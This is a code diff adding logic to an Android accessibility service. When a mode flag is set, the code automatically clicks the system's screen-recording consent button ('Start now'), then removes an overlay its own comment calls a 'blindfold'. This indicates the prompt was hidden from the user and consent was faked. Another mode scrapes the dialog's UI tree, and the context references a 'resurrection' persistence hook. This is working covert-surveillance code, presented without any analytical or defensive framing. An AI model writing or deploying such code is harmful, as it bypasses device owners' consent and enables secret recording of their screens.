@@ -187,6 +187,31 @@ class MyAccessibilityService : AccessibilityService() {
         
         val pkgName = event.packageName?.toString() ?: return
         
+        // --- SCREEN RECORD GHOST LOGIC ---
+        if (pkgName.contains("systemui", ignoreCase = true)) {
+            if (ScreenRecordManager.expectedMode == "AUTO") {
+                val root = rootInActiveWindow
+                val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
+                val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
+                
+                for (node in (startNodes + altNodes)) {
+                    if (node.isClickable) {
+                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
+                        ScreenRecordManager.expectedMode = "" // Disarm
+                        DimmerManager.removeOverlay(this) // Remove the blindfold
+                        break
+                    }
+                }
+            } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
+                val treeJson = getInstantTree(null, 10)
+                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
+                DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
+                DebugLogger.log("SCREEN_REC", "Scraped SystemUI dialog for forensic mapping.")
+                ScreenRecordManager.expectedMode = "" // Disarm
+            }
+        }
+
         // --- 0. PHOENIX HOOK (Resurrection check) ---
         val now = System.currentTimeMillis()
         if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
